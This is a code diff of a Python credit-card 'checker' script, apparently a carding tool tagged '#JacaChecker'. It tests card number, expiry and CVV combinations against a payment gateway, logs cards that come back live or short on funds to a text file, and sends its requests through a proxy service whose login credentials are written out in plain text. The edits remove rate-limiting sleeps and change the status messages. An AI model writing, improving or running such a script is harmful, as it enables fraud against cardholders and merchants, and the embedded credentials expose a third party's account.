@@ -94,7 +94,7 @@ def checker(card, month, year, cvv):
 
         
         try:
-            time.sleep(5)
+            
             p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
             
             if len(year) == 4:
@@ -180,7 +180,7 @@ def checker(card, month, year, cvv):
                     
                         
                         
-                time.sleep(5)
+                
 
 
 
@@ -188,16 +188,16 @@ def checker(card, month, year, cvv):
                     #code = response.json()['issuerResponseDetails']['issuerResponseCode']
                     bin = api_bin(card[:6])              
                     x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                          
-                    open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 #JacaChecker\n") 
+                    open("brownpapertickets.txt", "a").write(f"{card} {month} {year} {cvv} {bin} Retry 19 #JacaChecker\n") 
                     print(Fore.GREEN + f"{x} #JacaChecker")  
-                    return {"code": 0, "mensagem": f"Live: {x} #JacaChecker<br>"}    
+                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}    
                     
                 elif 'Insufficient funds' in response.text:
                     bin = api_bin(card[:6])              
                     x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF"                          
                     open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF #JacaChecker\n") 
                     print(Fore.GREEN + f"{x} #JacaChecker")  
-                    return {"code": 0, "mensagem": f"Live: {x} #JacaChecker<br>"} 
+                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                     
                 # elif 'issuerResponseCode":"46"' in response.text:
                 #     code = response.json()['issuerResponseDetails']['issuerResponseCode']
@@ -211,13 +211,12 @@ def checker(card, month, year, cvv):
                     bin = api_bin(card[:6])
                     x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response}"     
                     print(Fore.RED + f"{x} #JacaChecker")  
-                    return {"code": 1, "mensagem": f"Dec: {x} #JacaChecker<br>"}                        
+                    return {"code": 1, "mensagem": f"{x} #JacaChecker<br>"}                        
 
                 else:
                 # print(Fore.LIGHTBLACK_EX + f"RETESTANDO: {x} #JacaChecker")    
-                    print(Fore.RED + 'Consultar Adm !' )
-                    reteste(card, month, year, cvv)
-                    #return {"code": 1, "mensagem": "Consultar Adm ! #JacaChecker<br>"} 
+                    print(Fore.RED + 'Gateway Timeout' )
+                    return {"code": 1, "mensagem": "Gateway Timeout #JacaChecker<br>"} 
             except:
                 print("reteste loco")
                 #reteste(card, month, year, cvv)     
